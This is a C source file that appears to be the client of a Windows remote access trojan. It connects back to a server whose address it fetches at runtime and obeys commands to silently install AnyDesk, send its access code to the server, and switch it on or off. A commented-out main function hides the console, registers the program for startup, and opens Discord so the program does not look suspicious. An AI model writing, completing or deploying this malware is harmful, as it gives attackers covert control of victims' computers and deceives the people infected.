#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>
#include "CurlRequest.h"
#include "StartupRegister.h"
#include "AnyDeskFile.h"
#include "Helper.h"

// Functions
void connectToHost();
int getCommands();
int processCommand(int command);

// Global variables
int serverSocket;

void connectToHost()
{
    /*
    Connects to the server
    */

    struct Server server = getIpAndPort();
    while (strcmp(server.PORT, REQUEST_FAILED_ERROR) == 0) {
        printf("Can't get ip and port, try again in 1 mintue...");
        Sleep(60000);
        server = getIpAndPort();
    }

    struct sockaddr_in hostAddress;
    WSADATA wsaData;
    int iResult;

    
    while (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("WSAStartup failed: %d, trying again in 1 minute...\n", iResult);
        Sleep(60000);
    }

    // Creates the socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    while (serverSocket == -1)
    {
        printf("socket creation failed, trying again in 1 minutes \n");
        Sleep(60000);
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    }
    printf("Socket successfully created..\n");

    // Defines the server IP & PORT
    hostAddress.sin_family = AF_INET;
    hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
    hostAddress.sin_port = htons(atoi(server.PORT));

    // Connects to the server
    while (connect(serverSocket, (struct sockaddr *)&hostAddress, sizeof(hostAddress)) != 0)
    {
        printf("connection with the server failed %d, trying again in 5 minues... \n", GetLastError());
        //Sleep(300000);
        Sleep(2000);

        // ReDefines the server IP & PORT
        server = getIpAndPort();
        hostAddress.sin_family = AF_INET;
        hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
        hostAddress.sin_port = htons(atoi(server.PORT));
    }
    printf("connected to the server..\n");

    struct PcDetails pcDetails = getPcDetails();
    printf("Sending username");
}

int getCommands()
{
    /*
    Waits for the commands from the server and processes them

    return:
    0 - on sucess
    else - on error
    */

    int command = -1;

    while (true)
    {
        // Gets the command
        if (recv(serverSocket, (char *)&command, sizeof(command), 0) <= 0)
        {
            // TODO: checks that
            printf("Server connection has been closed!\n");
            return SOCKET_ERROR;
        }
        command = ntohl(command);
        if (processCommand(command) == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
    }
}

int processCommand(int command)
{
    /*
    Porcess [command]
    param 1: the command from the server

    return:
    0 - on sucess
    else - on error
    */

    switch (command)
    {
    case 0:
        if (installAnyDesk(serverSocket, anyDeskFilePath) == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
        break;

    case 1:
        if (sendCode(serverSocket) == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
        break;
    case 2:
        powerOnAnyDesk();
        break;
    case 3:
        powerOffAnyDesk();
        break;

    default:
        break;
    }

    return 0;
}

void checkIfProgramAlreadyRunning()
{
    CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
    if (GetLastError() == ERROR_ALREADY_EXISTS)   // did the mutex already exist?
        // return -1; // quit; mutex is released automatically
        exit(1);
}

//int main(int argc, char const *argv[])
//{
//    bool isThereError = false;
//
//    //hideConsoleWindow(); // Hides the console window
//
//    ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
//    checkIfProgramAlreadyRunning();
//    
//    //RegisterProgram();                                          // Registers the app to the startup
//    setAnyDeskFilePath();
//    
//    if (isTheAnyDeskFile(anyDeskFilePath)) {
//        _defineAnyDeskSettings(); // TODO: make it updated
//    }
//
//
//    connectToHost();
//
//    do
//    {
//        if (getCommands() == SOCKET_ERROR)
//        {
//            isThereError = true;
//            printf("Restart socket connection...\n");
//            connectToHost();
//        }
//    } while (isThereError);
//
//    return 0;
//}